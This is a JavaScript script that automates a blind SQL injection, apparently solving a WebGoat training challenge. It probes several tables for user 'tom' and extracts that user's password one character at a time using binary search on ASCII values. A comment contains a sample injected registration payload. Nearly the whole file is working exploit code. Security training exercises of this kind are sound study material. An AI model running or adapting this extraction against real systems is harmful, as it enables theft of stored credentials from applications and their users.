import { binarySearch, booleanTest, confirmValue } from './utility_functions.js'

/*
username_reg=tom' AND (select count(password) from (select password from CHALLENGE_USERS where userid='tom')) = 1 AND '1'='1&email_reg=aa%40aa&password_reg=12345&confirm_password_reg=12345
console.log(binarySearch)
*/


const checkIfPasswordExists = async (tableName, columnName) => {
  const sqlQuery = `(select password from ${tableName} where ${columnName}='tom')`
  return booleanTest('exists', '', sqlQuery)
}


const getPasswordLength = async (tableName, columnName) => {
  const sqlQuery = `select char_length(password) from (select password from ${tableName} where ${columnName} = 'tom')`;
  const length = await binarySearch(1, 128, sqlQuery)
  return confirmValue(length, sqlQuery);
}

const findPasswordChar = async (position, tableName, columnName) => {
  const sqlQuery = `select ascii(substring(password,${position},1)) from (select password from ${tableName} where ${columnName}  = 'tom')`;
  let asciiValue = await binarySearch(32, 122, sqlQuery)
  return confirmValue(asciiValue, sqlQuery)
}

const getTableColumn = async () => {

  if(await checkIfPasswordExists('USER_DATA_TAN', 'USERID'))
    return {
      tableName: 'USER_DATA_TAN',
      columnName: 'USERID'
    }
  if(await checkIfPasswordExists('USER_SYSTEM_DATA', 'USERID'))
    return {
      tableName: 'USER_SYSTEM_DATA',
      columnName: 'USERID'
    }
  if(await checkIfPasswordExists('USER_SYSTEM_DATA', 'USER_NAME'))
    return {
      tableName: 'USER_SYSTEM_DATA',
      columnName: 'USER_NAME'
    }
  if(await checkIfPasswordExists('WEB_GOAT_USER', 'USERNAME'))
    return {
      tableName: 'WEB_GOAT_USER',
      columnName: 'USERNAME'
    }
  if(await checkIfPasswordExists('CHALLENGE_USERS', 'USERID')) 
    return {
      tableName: 'CHALLENGE_USERS',
      columnName: 'USERID'
    }
}

(async function () {
//  console.log(await checkIfPasswordExists('CHALLENGE_USERS', 'USERID'))
//  console.log(await checkIfPasswordExists('USER_DATA_TAN', 'USERID'))
//  console.log(await checkIfPasswordExists('USER_SYSTEM_DATA', 'USERID'))
//  console.log(await checkIfPasswordExists('USER_SYSTEM_DATA', 'USER_NAME'))
//  console.log(await checkIfPasswordExists('WEB_GOAT_USER', 'USERNAME'))

  // We find that the there's an entry for USERID='tom' in CHALLENGE_USERS
  // We will find the value of password 
  //
  //
  const { tableName, columnName } = await getTableColumn()
  console.log(`Table name and column name respectively`, tableName, columnName)
  let passwordLength = await getPasswordLength('CHALLENGE_USERS', 'USERID')

  console.log(`Password length : ${passwordLength}`)
  let password = ''
  for(let i = 1; i <= passwordLength; i++) {
    let asciiValue = await findPasswordChar(i, 'CHALLENGE_USERS', 'USERID')
    password = password.concat(String.fromCharCode(asciiValue)) 
    console.log(password)
  }
})()
